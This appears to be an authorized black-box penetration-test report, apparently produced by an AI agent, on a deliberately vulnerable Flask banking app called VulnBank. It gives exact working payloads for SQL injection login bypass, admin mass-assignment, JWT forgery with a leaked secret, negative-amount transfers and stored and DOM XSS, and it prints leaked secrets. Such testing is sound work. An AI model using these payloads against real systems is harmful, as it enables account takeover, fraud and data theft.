# VulnBank engagement report — http://172.17.0.1:5003

**Date:** 2026-11-14 · **Scope:** `172.17.0.1:5003` only (scope.yaml) · **Mode:** black-box, active scanning and exploitation authorized, non-destructive
**Stack:** Python 3.9.25 / Flask (Werkzeug 2.0.1), PostgreSQL, JWT (HS256) auth
**Identities used:** `attacker_a`, `attacker_b`, `attacker_c` (created), merchants `M_A`, `M_B` (created). No real user's data was read, modified or dumped.

**Result: 21 validated findings — 7 critical, 8 high, 5 medium, 1 low — plus 1 candidate.**
Per-finding evidence lives in `findings/VB-*.md`; raw request/response pairs in `evidence/`.

Every validated finding carries a proof (exact request + response) and a negative control. All requests were sent by hand or via `scripts/probe`/`scripts/verify`; XSS execution was proven in a headless browser (dialog/console canaries, screenshots).

## Critical

### VB-001 — Production `.env` with all secrets exposed at `/.env` (secrets-exposure, CVSS 9.8)
- **Request:** `curl -sS http://172.17.0.1:5003/.env`
- **Response (excerpt, `evidence/env.txt`):** `SECRET_KEY=…`, `JWT_SECRET=00af85a8f47d41f7bfb9ce45ad1130aa`, `DB_PASSWORD=VbProd_2026_DbAccess!`, `REDIS_URL=redis://:VbRedis_2026!@…`, `SMTP_PASSWORD=MailRelay_2026!`, `DEEPSEEK_API_KEY=ds_live_…`, `FLASK_DEBUG=true`
- **Control:** `/.env.bak` → 404 (the file itself is served, not a directory listing).
- **Impact:** signing-key + database/mail/API credentials; chained to VB-007 (admin JWT forgery).

### VB-002 — SQL injection in `POST /login` `username` → admin auth bypass (sql-injection, CVSS 9.8)
- **Request:** `POST /login` `{"username":"' OR 1=1 LIMIT 1--","password":"x"}`
- **Response (`evidence/sqli-login-admin.json`):** `200` with `username: "admin"`, `is_admin: true`, `user_id: 1` and a **working admin JWT**.
- **Control:** `admin`/`wrongpass` → `Invalid credentials` (`evidence/nc-login.txt`).
- **Impact:** unauthenticated full admin takeover; all `/admin/*` routes become reachable.

### VB-003 — SQL injection in `POST /api/v1/merchants/login` `email` → merchant #1 takeover (sql-injection, CVSS 9.8)
- **Request:** `{"email":"' OR 1=1--","password":"x"}`
- **Response (`evidence/merchant-login-sqli.json`):** merchant `id 1` (`bookstore@vulnbank.org`) with its **live API key** `vk_fe675f…` and JWT.
- **Control:** wrong password → `Invalid credentials` (`evidence/nc-merchant.txt`).
- **Impact:** unauthenticated takeover of a production merchant identity (charging + payment history incl. card numbers).

### VB-004 — Unauthenticated SQLi in `GET /check_balance/{account_number}` (sql-injection, CVSS 9.8)
- **Requests / responses (`evidence/idor-checkbalance.txt`, `evidence/nc-checkbalance.txt`):
  - `/check_balance/x%27%20OR%20%271%27=%271` → `{"username":"admin","balance":1000000.0}` (first row)
  - `…OR%20%271%27=%272` → `Account not found` — boolean oracle
  - `…OR%20substr(version(),1,6)=%27Postgr` → admin row returned → arbitrary data extraction proven (PostgreSQL confirmed)
  - a lone `'` → raw SQL error echoing `WHERE account_number='241627199…'`
- **Impact:** unauthenticated extraction of the whole `users` table (incl. stored passwords).

### VB-006 — Mass assignment in `POST /register`: `is_admin` + `balance` (mass-assignment, CVSS 9.8)
- **Request:** `{"username":"attacker_c","password":"…","is_admin":true,"balance":999999}`
- **Response (`evidence/reg-c-massassign2.json`):** `is_admin: true, balance: 999999.0, fields_registered:[…,is_admin,balance]`; login returns `isAdmin: true` and the token opens `/sup3r_s3cr3t_admin` (200, 57 kB admin panel).
- **Control:** registering without the fields yields `is_admin: false` (`evidence/reg-a.txt`).
- **Impact:** any anonymous visitor self-provisions a full administrator with arbitrary balance. (The rejected `role` field additionally leaked the INSERT statement — VB-021.)

### VB-007 — Admin JWT forgery with the leaked `JWT_SECRET` (jwt, CVSS 9.8)
- **Request:** HS256 token signed offline (`evidence/forged_admin_token.txt`), payload `{"user_id":10,"username":"attacker_a","is_admin":true,"iat":…}` → `GET /sup3r_s3cr3t_admin`
- **Response (`evidence/forged-admin-adminpanel.json`):** full admin panel HTML.
- **Control:** legitimate non-admin token → `Access Denied` (`evidence/nc-jwt.txt`).
- **Impact:** permanent, unexpiring admin access (issued tokens carry **no `exp` claim**) for anyone who reads `/.env`.

### VB-019 — Werkzeug debugger console enabled in production (information-disclosure, CVSS 9.0)
- **Request:** `GET /console`
- **Response (`evidence/console.html`):** `200`, the Werkzeug Debugger console UI; `?__debugger__=yes&cmd=resource&f=debugger.js` also 200. Consistent with `FLASK_DEBUG=true` in `.env`.
- **RCE status:** execution is PIN-gated; the PIN was not derivable black-box and brute force was not attempted per rules — **code execution unconfirmed, exposure confirmed**.
- **Impact:** debugger console on a reachable banking app is RCE-by-design once the PIN falls (host info leak, weak entropy on older Werkzeug).

## High

### VB-005 — SQLi in `GET /api/transactions?account_number` (sql-injection, CVSS 8.8)
- **Request:** `?account_number=1073024486%27` with userA's token
- **Response:** `syntax error at or near "1073024486" … WHERE from_account='1073024486'' OR to_account='1073024486…'` — unparameterized concatenation, error-based.
- **Control:** no token → 401 (`evidence/nc-apitransactions.txt`). Impact: authenticated arbitrary table read.

### VB-009 — Unauthenticated balance/transaction disclosure for any account (access-control, CVSS 7.5)
- **Request:** `curl http://172.17.0.1:5003/check_balance/2416271994` (no headers)
- **Response (`evidence/idor-checkbalance.txt`):** `{"username":"attacker_a","balance":1000.0}`; `GET /transactions/2416271994` likewise returns the full history (`evidence/idor-transactions.txt`).
- **Control:** `/api/transactions` correctly demands a token — the app can enforce auth; these two routes don't.
- **Impact:** anyone enumerates 10-digit account numbers → all customers' balances and histories.

### VB-011 — BOLA on virtual cards: cross-user freeze + transaction read (bola, CVSS 8.8)
- **Request:** as userB: `POST /api/virtual-cards/5/toggle-freeze` (card 5 belongs to userA)
- **Response:** `Card frozen successfully`; userA's card list then shows `is_frozen: true` (`evidence/vc-bola-freeze.txt`, `evidence/vc-list-a.json`). `GET /api/virtual-cards/5/transactions` as B also 200.
- **Control:** B's own card list correctly returns only B's cards (`evidence/nc-vc.txt`); `update-limit` is broken server-side (raw SQL error, VB-021) and was not usable.
- **Impact:** any customer freezes/surveils any other customer's cards (sabotage of payments).

### VB-013 — Negative-amount transfer mints balance / drains victims (business-logic, CVSS 8.8)
- **Request:** `POST /transfer` `{"to_account":"1073024486","amount":-1}` as userA
- **Response (`evidence/transfer-negative.txt`):** `Transfer Completed`, balance 1110 → 1111 (**sender credited**); recipient debited (B: 1000 → 990 over the earlier -10 test).
- **Control:** a normal `+1` transfer behaves correctly (`evidence/transfer-positive-control.txt`).
- **Impact:** unlimited money creation + arbitrary destruction of any known account's balance.

### VB-014 — Negative-amount bill payment credits the payer (business-logic, CVSS 8.8)
- **Request:** `POST /api/bill-payments/create` `{"biller_id":1,"amount":-100,"payment_method":"balance"}`
- **Response (`evidence/billpay-negative.json`):** `Payment processed successfully`, reference `BILL1794622786`; balance 1010 → 1110. Also below the biller's `minimum_amount: 10` — no validation at all (the OpenAPI description admits it).
- **Control:** over-balance positive amount → correctly rejected `Insufficient balance`.
- **Impact:** infinite free balance.

### VB-015 — Stored XSS via unrestricted upload served inline `text/html` (stored-xss, CVSS 8.7)
- **Request:** `POST /upload_profile_picture` with `x.html` = `<script>alert(document.domain)</script>` (normal user)
- **Response:** stored at `static/uploads/840065_x.html`, served `Content-Type: text/html`, `Content-Disposition: inline`. **Browser-executed:** Playwright captured dialog `alert`, message `172.17.0.1` (`evidence/xss-stored-upload.png/.log`).
- **Impact:** persistent attacker JS on the bank origin against any visitor; no extension/MIME validation.

### VB-016 — DOM XSS via `?q=` → `innerHTML` on `/blog` and `/careers` (dom-xss, CVSS 8.3)
- **Request:** `GET /blog?q=<img src=x onerror="window.__XSS_CANARY__=1;console.log('XSS-BLOG-EXECUTED')">`
- **Response:** executed in headless browser — `window.__XSS_CANARY__ === 1` and console line captured; screenshots `evidence/xss-blog-dom.png`, `xss-careers-dom.png` + logs. Sink: `searchInfo.innerHTML = 'Searching for: <strong>' + query + '</strong>'` (blog L195, careers L223).
- **Impact:** reflected XSS on two public pages via crafted links.

### VB-017 — `/api/ai/system-info` leaks full system prompt + DB schema (information-disclosure, CVSS 7.5)
- **Request:** `GET /api/ai/system-info` (no auth; IP-limited 5/3 h, bypassed with any token)
- **Response (`evidence/ai-system-info-full.json`):** complete system prompt documenting `users(id, username, password, account_number, balance, is_admin…)` and `transactions`, `database_access: true`, demo-attack list, `model: deepseek-chat`, `api_key_configured: false`.
- **Impact:** hands over the data model and the attack roadmap; also proves a stored password column exists.

## Medium

### VB-008 — BOLA: `GET /api/v3/user/{user_id}` returns any user's profile/balance to a normal user (bola, CVSS 6.5)
- As userA: `/api/v3/user/11` → attacker_b's `{username, account_number, balance}`; `/api/v3/user/1` → admin's, balance 1,000,000 (`evidence/userv3-bola.txt`). Control: no token → 401 (`evidence/nc-userv3.txt`). Undocumented route (found in admin-panel JS).

### VB-010 — BOLA: `GET /api/transactions?account_number=` cross-user read (bola, CVSS 6.5)
- userA's token + `account_number=1073024486` (userB) → B's transactions returned (`evidence/idor-transactions.txt`). Control: token-less request → 401.

### VB-012 — BOLA: `GET /api/v1/payments/merchant_id/{merchant_id}` + unmasked card numbers (bola, CVSS 6.5)
- Merchant B's key lists merchant A's payments, incl. `card_number: 5531202218041773` in clear (`evidence/pay-bola-list.txt`). Control: `GET /api/v1/payments/6` as B → `Payment not found` (ownership enforced there, `evidence/nc-payments-id.txt`). PAN storage violates PCI DSS 3.4.

### VB-020 — No rate limiting/lockout on login and reset-PIN (auth-flows-ato, CVSS 5.3)
- 8 rapid failed logins → all 401, no 429/lockout; 8 rapid wrong 4-digit reset PINs → all 400 `Invalid reset PIN` (`evidence/nc-login.txt`). Light demonstration only (no brute force performed, per rules). The 10⁴ PIN space falls in minutes at modest rates. AI endpoints, by contrast, are correctly limited (5/3 h IP / 10/3 h user).

### VB-021 — Debug data & credentials echoed; raw SQL errors leak schema (information-disclosure, CVSS 5.3)
- `/register` and `/login` responses echo the submitted **password** (`raw_data.password`) plus `user_id`, `server_info` (`evidence/reg-a.txt`); merchant register echoes password + API key; unknown field `role` → raw `INSERT INTO users (username, password, account_number, is_admin, balance, role)` error; `/api/transactions` and `update-limit` leak their SQL.

## Low

### VB-022 — Missing CSP/HSTS/X-Content-Type-Options, `Access-Control-Allow-Origin: *` (headers-cors, CVSS 3.7)
- Header dump `evidence/headers.txt`. Removes defense-in-depth against VB-015/016; enables MIME sniffing of uploads.

## Chained impact summary

An anonymous attacker needs exactly one request to become admin (`' OR 1=1 LIMIT 1--` at `/login`, VB-002), or one registration with `is_admin:true` (VB-006), and can silently mint money (VB-013/014), read any customer's finances (VB-004/008/009/010), freeze their cards (VB-011), take over merchants (VB-003), and plant stored XSS on the origin (VB-015).


===== final message =====
Billers route uses an int converter (quote → 404, no SQLi; note the `-100` payment also bypassed the biller's `minimum_amount: 10`). Writing the final report.
